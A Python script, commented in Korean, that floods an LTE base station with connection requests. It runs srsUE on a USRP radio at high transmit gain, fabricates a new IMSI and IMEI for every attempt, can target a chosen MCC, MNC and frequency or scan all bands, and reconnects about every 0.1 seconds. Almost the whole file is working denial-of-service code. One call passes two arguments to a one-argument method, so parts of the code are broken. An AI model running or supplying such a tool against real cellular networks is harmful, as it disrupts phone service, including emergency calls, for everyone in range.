#!/usr/bin/env python3
"""
LTE Flooding Script
USRP 장치를 사용하여 srsRAN eNB에 연결 요청을 반복적으로 전송합니다.
"""

import subprocess
import time
import signal
import sys
import os
import re
from typing import Optional
import argparse
import logging
from pathlib import Path

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class LTEFlooder:
    """LTE 연결 요청 flooding을 수행하는 클래스"""
    
    def __init__(self, usrp_args: str, 
                 interval: float = 0.1, srsue_config: str = "srsue.conf",
                 mcc: Optional[int] = None, mnc: Optional[int] = None,
                 earfcn: Optional[int] = None):
        """
        Args:
            usrp_args: USRP 장치 인자 (예: "serial=30AD123")
            interval: 각 연결 시도 사이의 간격 (초)
            srsue_config: srsUE 설정 파일 경로
            mcc: Mobile Country Code (예: 123)
            mnc: Mobile Network Code (예: 456)
            earfcn: 주파수 채널 번호 (예: 3400)
        """
        self.usrp_args = usrp_args
        self.interval = interval
        self.srsue_config = srsue_config
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.process: Optional[subprocess.Popen] = None
        self.running = False
        
        # .env 파일에서 USIM 키 로드
        self.usim_opc, self.usim_k = self._load_usim_keys()
        
        # 실행 횟수 카운터 (매번 다른 IMSI/IMEI 생성을 위해)
        self.attempt_count = 0
    
    def _load_usim_keys(self) -> tuple[str, str]:
        """환경변수 또는 .env 파일에서 USIM 키 로드"""
        # 환경변수에서 먼저 확인
        opc = os.getenv('USIM_OPC')
        k = os.getenv('USIM_K')
        
        # .env 파일에서 로드
        env_file = Path('.env')
        if env_file.exists():
            with open(env_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or not line:
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'USIM_OPC' and not opc:
                            opc = value
                        elif key == 'USIM_K' and not k:
                            k = value
        
        # .env 파일이나 환경변수에서 값을 찾지 못한 경우
        if not opc or not k:
            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
            logger.error("예제: .env 파일에 'USIM_OPC=...' 및 'USIM_K=...' 추가")
            raise ValueError("USIM 키가 설정되지 않았습니다. .env 파일을 확인하세요.")
        
        return opc, k
    
    def check_usrp_connection(self) -> bool:
        """USRP 장치 연결 확인"""
        logger.info("USRP 장치 연결 확인 중...")
        
        try:
            # uhd_find_devices로 장치 확인
            result = subprocess.run(
                ["uhd_find_devices"],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            # 시리얼 번호 추출
            serial_match = re.search(r'serial:\s*([^\s,]+)', result.stdout + result.stderr)
            if serial_match:
                found_serial = serial_match.group(1)
                # 사용자가 지정한 시리얼 추출
                user_serial_match = re.search(r'serial=([^\s"]+)', self.usrp_args)
                user_serial = user_serial_match.group(1) if user_serial_match else None
                
                if user_serial and found_serial.upper() == user_serial.upper():
                    logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                    return True
                elif user_serial:
                    logger.warning(f"지정한 시리얼({user_serial})과 발견된 시리얼({found_serial})이 다릅니다")
                    logger.info(f"발견된 장치 사용: serial={found_serial}")
                    return True
                else:
                    # 시리얼이 지정되지 않았으면 첫 번째 장치 사용
                    logger.info(f"✓ USRP 장치 발견: serial={found_serial}")
                    return True
            
            # srsUE로 직접 확인 시도
            test_config = self.create_ue_config(0, 0)
            test_cmd = [
                "srsue",
                test_config,
                "--log.all_level", "error",
                "--log.filename", "/dev/null"
            ]
            
            test_process = subprocess.Popen(
                test_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # 3초 동안 실행하여 연결 확인
            time.sleep(3)
            
            if test_process.poll() is None:
                # 프로세스가 실행 중이면 연결 성공 가능성
                test_process.terminate()
                test_process.wait(timeout=2)
                logger.info("✓ USRP 장치 연결 확인됨 (srsUE 실행 가능)")
                # 테스트 config 파일 삭제
                if os.path.exists(test_config):
                    os.remove(test_config)
                return True
            else:
                # 프로세스가 종료되었으면 오류 확인
                _, stderr = test_process.communicate()
                if "error" in stderr.lower() or "failed" in stderr.lower():
                    logger.error("✗ USRP 장치 연결 실패")
                    logger.error(f"오류: {stderr[:200]}")
                    # 테스트 config 파일 삭제
                    if os.path.exists(test_config):
                        os.remove(test_config)
                    return False
                else:
                    logger.info("✓ USRP 장치 연결 확인됨")
                    # 테스트 config 파일 삭제
                    if os.path.exists(test_config):
                        os.remove(test_config)
                    return True
                    
        except subprocess.TimeoutExpired:
            logger.warning("USRP 확인 시간 초과")
            return False
        except FileNotFoundError:
            logger.error("✗ srsUE를 찾을 수 없습니다. srsRAN이 설치되어 있는지 확인하세요.")
            return False
        except Exception as e:
            logger.warning(f"USRP 확인 중 오류: {e}")
            return False
        
    def create_ue_config(self, unique_id: int) -> str:
        """고유한 설정 파일 생성 (매번 다른 IMSI/IMEI)"""
        # EARFCN 설정 (주파수)
        # 주파수를 지정하지 않고 MCC/MNC만 지정한 경우, 주파수 스캔을 비활성화
        # (srsUE가 자동으로 모든 주파수를 스캔하도록)
        if self.earfcn is not None:
            earfcn_value = self.earfcn
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        elif (self.mcc is not None or self.mnc is not None):
            # MCC/MNC만 지정하고 주파수를 지정하지 않은 경우
            # 주파수 라인을 주석 처리하여 자동 스캔 활성화
            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
            earfcn_value = "자동 스캔"
        else:
            # 둘 다 지정하지 않은 경우 기본값 사용
            earfcn_value = 3400
            earfcn_line = f"dl_earfcn = {earfcn_value}"
        
        # MCC/MNC 설정 (선택사항)
        mcc_mnc_section = ""
        target_info = []
        if self.mcc is not None:
            target_info.append(f"MCC={self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC={self.mnc}")
        
        # target_info 로그는 한 번만 출력하도록 제거 (너무 많이 출력됨)
        # if target_info:
        #     if isinstance(earfcn_value, str):
        #         logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (모든 주파수 자동 스캔)")
        #     else:
        #         logger.info(f"{', '.join(target_info)}로 설정된 eNB를 찾습니다 (주파수: EARFCN {earfcn_value})")
        
        # IMSI 포맷: MCC(3자리) + MNC(2-3자리) + MSIN(나머지, 최대 15자리)
        # unique_id를 사용하여 매번 다른 IMSI 생성
        if self.mcc is not None and self.mnc is not None:
            # 둘 다 지정된 경우
            mnc_digits = 3 if self.mnc >= 100 else 2
            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        elif self.mcc is not None:
            # MCC만 지정된 경우 (MNC는 기본값 01 사용)
            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
            imsi = f"{self.mcc:03d}01{unique_id:010d}"
        elif self.mnc is not None:
            # MNC만 지정된 경우 (MCC는 기본값 001 사용)
            mnc_digits = 3 if self.mnc >= 100 else 2
            # MCC(3) + MNC(2-3) = 5-6자리, 나머지 9-10자리를 unique_id로 채움
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        else:
            # 둘 다 지정되지 않은 경우
            # MCC(3) + MNC(2) = 5자리, 나머지 10자리를 unique_id로 채움
            imsi = f"00101{unique_id:010d}"
        
        config_content = f"""[rf]
device_name = uhd
device_args = {self.usrp_args}
tx_gain = 90
rx_gain = 60
nof_antennas = 1

[rat.eutra]
{earfcn_line}
{mcc_mnc_section}
nof_carriers = 1

[usim]
mode = soft
algo = milenage
opc  = {self.usim_opc}
k    = {self.usim_k}
imsi = {imsi}
imei = 353490069873{unique_id:06d}

[pcap]
enable = true
mac_filename = /tmp/srsue_{unique_id}_mac.pcap
nas_filename = /tmp/srsue_{unique_id}_nas.pcap
"""
        config_path = f"srsue_{unique_id}.conf"
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path
    
    def run_flooding(self):
        """srsUE 실행 (연결 성공 시 즉시 종료하여 빠른 재연결, 매번 다른 IMSI/IMEI)"""
        log_file = "srsue_flooding.log"
        
        while self.running:
            # 매번 새로운 고유 ID 생성 (다른 핸드폰처럼)
            self.attempt_count += 1
            unique_id = self.attempt_count
            config_path = self.create_ue_config(unique_id)
            
            try:
                logger.info(f"연결 시도 중... (시도 {self.attempt_count}, IMSI 범위: {unique_id})")
                cmd = [
                    "srsue",
                    config_path,
                    "--log.filename", log_file,
                    "--log.all_level", "info"
                ]
                
                # macOS와 Linux 호환성을 위한 프로세스 그룹 설정
                kwargs = {
                    'stdout': subprocess.PIPE,
                    'stderr': subprocess.PIPE,
                }
                # macOS에서는 setsid가 없으므로 조건부로 추가
                if hasattr(os, 'setsid'):
                    kwargs['preexec_fn'] = os.setsid
                elif sys.platform == 'darwin':
                    # macOS에서는 process group을 다르게 처리
                    kwargs['start_new_session'] = False
                
                process = subprocess.Popen(cmd, **kwargs)
                
                self.process = process
                
                # 연결 성공 감지를 위한 로그 모니터링
                connection_success = False
                enb_found = False
                start_time = time.time()
                max_wait_time = 30  # 최대 30초 대기 (연결 시도 시간)
                last_log_check = start_time
                process_exited_early = False
                process_stderr = None
                
                while process.poll() is None and (time.time() - start_time) < max_wait_time:
                    current_time = time.time()
                    elapsed = current_time - start_time
                    
                    # 로그 파일에서 연결 성공 여부 확인
                    if os.path.exists(log_file):
                        try:
                            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                log_content = f.read()
                                
                                # eNB 찾았는지 확인 (셀 탐색 단계)
                                # "No cell found" 같은 부정 메시지가 없고, 실제로 셀을 찾았는지 확인
                                no_cell_found = any(keyword in log_content.lower() for keyword in [
                                    'no cell found',
                                    'could not find any cell',
                                    'no more frequencies',
                                    'cell search: no cell'
                                ])
                                
                                # 실제로 셀을 찾았는지 확인 (더 구체적인 키워드)
                                cell_found_positive = any(keyword in log_content.lower() for keyword in [
                                    'found plmn',
                                    'found cell',  # "Found Cell:" 메시지
                                    'cell found with pci',
                                    'detected cell with pci',
                                    'synchronized to cell',
                                    'rrc connection request',  # RRC 요청을 보냈다면 셀을 찾은 것
                                    'connection request',  # 연결 요청을 보냈다면 셀을 찾은 것
                                    'sending rrc',
                                    'rrc connection setup',
                                    'random access',  # Random Access 시도 = 셀을 찾은 것
                                    'rach',  # RACH 요청 = 셀을 찾은 것
                                    'rrc connected',  # RRC 연결 성공
                                    'attaching ue'  # UE 연결 시도 중
                                ])
                                
                                if not enb_found and cell_found_positive and not no_cell_found:
                                    enb_found = True
                                    logger.info(f"셀을 찾았습니다! (소요 시간: {elapsed:.1f}초)")
                                elif not enb_found and no_cell_found:
                                    # 셀을 찾지 못했다는 명확한 메시지 (너무 자주 출력하지 않도록)
                                    if elapsed % 5.0 < 0.5:  # 5초마다 한 번만 출력
                                        logger.warning(f"셀을 찾지 못했습니다 (소요 시간: {elapsed:.1f}초) - 주파수 스캔 중...")
                                
                                # RRC 연결 시도 확인
                                rrc_attempted = any(keyword in log_content.lower() for keyword in [
                                    'rrc connection request',
                                    'rrc connection setup',
                                    'sending rrc',
                                    'rrc connection'
                                ])
                                
                                # NAS 메시지 확인
                                nas_attempted = any(keyword in log_content.lower() for keyword in [
                                    'attach request',
                                    'nas message',
                                    'sending nas'
                                ])
                                
                                # 연결 성공 키워드 확인 (RRC 연결만 성공해도 충분 - flooding 목적)
                                if any(keyword in log_content.lower() for keyword in [
                                    'rrc connection setup complete',
                                    'rrc connected',
                                    'random access complete',  # RACH 성공 = 연결 시도 성공
                                    'random access transmission',  # RACH 전송 시작 = 연결 시도
                                    'attached',
                                    'registered',
                                    'attach accept'
                                ]):
                                    connection_success = True
                                    logger.info(f"연결 성공했습니다! (소요 시간: {elapsed:.1f}초)")
                                    # 연결 성공 시 즉시 프로세스 종료
                                    if process.poll() is None:
                                        process.terminate()
                                        try:
                                            process.wait(timeout=1)
                                        except subprocess.TimeoutExpired:
                                            process.kill()
                                            process.wait()
                                    break
                                
                                
                        except:
                            pass
                    
                    # 5초마다 진행 상황 로그 (너무 많이 출력되지 않도록)
                    if current_time - last_log_check >= 5.0:
                        if not enb_found:
                            logger.debug(f"eNB 탐색 중... ({elapsed:.1f}초 경과)")
                        last_log_check = current_time
                    
                    time.sleep(0.5)  # 0.5초마다 로그 확인
                
                # 프로세스가 조기 종료되었는지 확인
                if process.poll() is not None and (time.time() - start_time) < max_wait_time:
                    process_exited_early = True
                    return_code = process.returncode
                    
                    # 로그 파일에서 에러 메시지 확인
                    error_found = False
                    if os.path.exists(log_file):
                        try:
                            with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
                                log_lines = f.readlines()
                                # 마지막 30줄에서 에러 확인 (더 많은 컨텍스트)
                                for line in log_lines[-30:]:
                                    line_lower = line.lower()
                                    if any(keyword in line_lower for keyword in [
                                        'error', 'failed', 'fatal', 'exception', 'could not', 'unable to',
                                        'authentication failure', 'authentication reject', 'attach reject',
                                        'security mode reject', 'rrc connection reject', 'nas reject',
                                        'reject', 'authentication failed'
                                    ]):
                                        error_found = True
                                        logger.error(f"프로세스가 에러로 종료되었습니다 (종료 코드: {return_code})")
                                        logger.error(f"에러 메시지: {line.strip()[:300]}")
                                        # 추가 컨텍스트 출력 (이전/다음 줄)
                                        line_idx = log_lines.index(line)
                                        if line_idx > 0:
                                            logger.error(f"이전 컨텍스트: {log_lines[line_idx-1].strip()[:200]}")
                                        if line_idx < len(log_lines) - 1:
                                            logger.error(f"다음 컨텍스트: {log_lines[line_idx+1].strip()[:200]}")
                                        break
                        except:
                            pass
                    
                    # stderr 확인 (프로세스가 이미 종료되었으므로 읽기 가능)
                    if not error_found:
                        try:
                            if process.stderr:
                                # 프로세스가 종료되었으므로 stderr 읽기 시도
                                process.stderr.seek(0)
                                process_stderr = process.stderr.read()
                                if process_stderr and len(process_stderr) > 0:
                                    error_msg = process_stderr[:300].decode('utf-8', errors='ignore') if isinstance(process_stderr, bytes) else process_stderr[:300]
                                    if any(keyword in error_msg.lower() for keyword in ['error', 'failed', 'fatal', 'exception']):
                                        logger.error(f"프로세스가 에러로 종료되었습니다 (종료 코드: {return_code})")
                                        logger.error(f"에러 메시지: {error_msg.strip()}")
                        except (AttributeError, OSError, ValueError):
                            # stderr가 읽을 수 없는 경우 (이미 닫혔거나 seek 불가능)
                            pass
                
                # 프로세스가 아직 실행 중이면 종료
                if process.poll() is None:
                    process.terminate()
                    try:
                        process.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        process.kill()
                        process.wait()
                
                # 프로세스 종료 후 config 파일 삭제
                if os.path.exists(config_path):
                    try:
                        os.remove(config_path)
                    except:
                        pass
                
                # 결과 로깅
                elapsed_time = time.time() - start_time
                
                if connection_success:
                    logger.info(f"연결 성공 - 다음 핸드폰으로 재시작합니다...")
                elif process_exited_early:
                    if enb_found:
                        logger.warning(f"eNB는 찾았지만 프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
                    else:
                        logger.warning(f"프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
                else:
                    if enb_found:
                        logger.warning(f"eNB는 찾았지만 연결에 실패했습니다 (총 소요 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
                    else:
                        logger.warning(f"eNB를 찾지 못했습니다 (총 대기 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
                
                if self.running:
                    # interval이 0이면 즉시 재시작, 아니면 지정된 간격만큼 대기
                    if self.interval > 0:
                        time.sleep(self.interval)
                    # interval이 0이면 바로 재시작 (대기 없음)
                    
            except Exception as e:
                logger.error(f"연결 시도 중 오류: {e}")
                if self.running:
                    if self.interval > 0:
                        time.sleep(self.interval)
    
    def start(self):
        """Flooding 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        # USRP 장치 연결 확인
        if not self.check_usrp_connection():
            logger.error("USRP 장치 연결을 확인할 수 없습니다. 프로그램을 종료합니다.")
            raise RuntimeError("USRP 장치 연결 실패")
        
        self.running = True
        target_info = []
        if self.earfcn is not None:
            target_info.append(f"주파수: EARFCN {self.earfcn}")
        if self.mcc is not None:
            target_info.append(f"MCC: {self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC: {self.mnc}")
        
        target_str = ", ".join(target_info) if target_info else "기본 설정"
        logger.info(f"LTE Flooding 시작: 간격: {self.interval}초, 대상: {target_str}")
        
        # 단일 프로세스로 실행 (매번 다른 IMSI/IMEI 사용)
        self.run_flooding()
    
    def stop(self):
        """Flooding 중지"""
        if not self.running:
            return
        
        logger.info("LTE Flooding 중지 중...")
        self.running = False
        
        # 프로세스 종료 (macOS와 Linux 호환)
        if self.process:
            try:
                if sys.platform == 'darwin':
                    # macOS에서는 직접 terminate 사용
                    self.process.terminate()
                elif hasattr(os, 'killpg'):
                    # Linux에서는 프로세스 그룹으로 종료
                    try:
                        os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                    except (OSError, ProcessLookupError):
                        self.process.terminate()
                else:
                    self.process.terminate()
                
                try:
                    self.process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # 타임아웃 시 강제 종료
                    if sys.platform == 'darwin':
                        self.process.kill()
                    elif hasattr(os, 'killpg'):
                        try:
                            os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
                        except (OSError, ProcessLookupError):
                            self.process.kill()
                    else:
                        self.process.kill()
                    self.process.wait()
            except Exception as e:
                logger.error(f"프로세스 종료 오류: {e}")
                try:
                    self.process.kill()
                except:
                    pass
        
        self.process = None
        
        # 임시 설정 파일 정리 (모든 인스턴스의 config 파일 삭제)
        import glob
        config_pattern = "srsue_*.conf"
        for config_path in glob.glob(config_pattern):
            try:
                os.remove(config_path)
            except:
                pass
        
        logger.info("LTE Flooding이 중지되었습니다.")


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding - USRP를 사용하여 srsRAN eNB에 연결 요청을 반복 전송"
    )
    parser.add_argument(
        "--usrp-args",
        type=str,
        default="serial=30AD123",
        help="USRP 장치 인자 (예: serial=30AD123 또는 type=b200)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="각 연결 시도 사이의 간격(초) (기본값: 0.1)"
    )
    parser.add_argument(
        "--mcc",
        type=int,
        default=None,
        help="Mobile Country Code (예: 123). MCC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--mnc",
        type=int,
        default=None,
        help="Mobile Network Code (예: 456). MNC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--earfcn",
        type=int,
        default=None,
        help="주파수 채널 번호 (EARFCN). 특정 주파수를 지정합니다. (기본값: 3400)"
    )
    
    args = parser.parse_args()
    
    flooder = LTEFlooder(
        usrp_args=args.usrp_args,
        interval=args.interval,
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn
    )
    
    # 시그널 핸들러 설정
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        flooder.start()
        
        # 메인 스레드 대기
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logger.info("\n사용자에 의해 중지됨")
    finally:
        flooder.stop()


if __name__ == "__main__":
    main()

